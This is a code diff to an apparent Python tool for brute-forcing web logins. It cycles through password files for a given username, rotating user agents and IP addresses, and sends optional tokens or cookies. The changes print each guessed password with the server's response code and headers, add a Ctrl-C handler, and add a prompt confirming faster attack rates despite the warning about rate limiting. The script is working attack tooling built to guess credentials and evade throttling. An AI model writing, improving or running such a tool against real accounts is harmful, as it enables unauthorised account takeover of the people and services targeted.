@@ -9,6 +9,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 import sys
 import os
+import signal
 
 init(autoreset=True)
 
@@ -133,12 +134,16 @@ def estimate_time_left(total_attempts, passwords, start_time):
     estimated_time = (elapsed_time / total_attempts) * attempts_left
     print(f"Estimated time left: {estimated_time / 60:.2f} minutes")
 
-def print_box(title, content, stats=None):
+def print_box(title, content, stats=None, response_code=None, response_header=None):
     sys.stdout.write(f"\033[F\033[K{Fore.CYAN}==========================================\n")
     sys.stdout.write(f"{Fore.GREEN}{title}\n")
     sys.stdout.write(f"{Fore.WHITE}{content}\n")
     if stats:
         sys.stdout.write(f"{Fore.YELLOW}{stats}\n")
+    if response_code:
+        sys.stdout.write(f"Response Code: {response_code}\n")
+    if response_header:
+        sys.stdout.write(f"Response Header: {response_header}\n")
     sys.stdout.write(f"{Fore.CYAN}==========================================\n")
 
 def prompt_user():
@@ -151,6 +156,13 @@ def prompt_user():
         if delay < 1 or delay > 5:
             print(Fore.RED + "Invalid input. Using system defined delay.")
             return True
+        elif delay >= 5:
+            print(Fore.RED + "Are you sure you want to go this fast? The server may rate-limit requests.")
+            confirmation = input("1. Yes  2. No: ")
+            if confirmation == '1':
+                return False
+            else:
+                return True
         else:
             return False
     return True
@@ -162,6 +174,12 @@ def check_delay_customization():
             return True
         else:
             print(Fore.RED + "Custom delay too high. You are proceeding at your own risk.")
+
+def signal_handler(sig, frame):
+    print("\n[INFO] Process interrupted. Exiting safely...")
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
 
 def brute_force(username, password_files, token=None, cookie=None, email_updates=None, randomize_rate=True):
     total_attempts = 0
@@ -184,8 +202,8 @@ def brute_force(username, password_files, token=None, cookie=None, email_updates
 
             response = attempt_login(username, password, user_agent, ip_address, token, cookie)
             success = "Success" if response and response.status_code == 200 else "Failure"
-
-            print_box(f"Current Password Guess: {password}", "", f"Success: {success}")
+            
+            print_box(f"Current Password Guess: {password}", "", f"Success: {success}", response_code=response.status_code if response else "N/A", response_header=response.headers if response else "N/A")
             log_attempt(username, password, success, retries=total_attempts)
 
             if success == "Success":
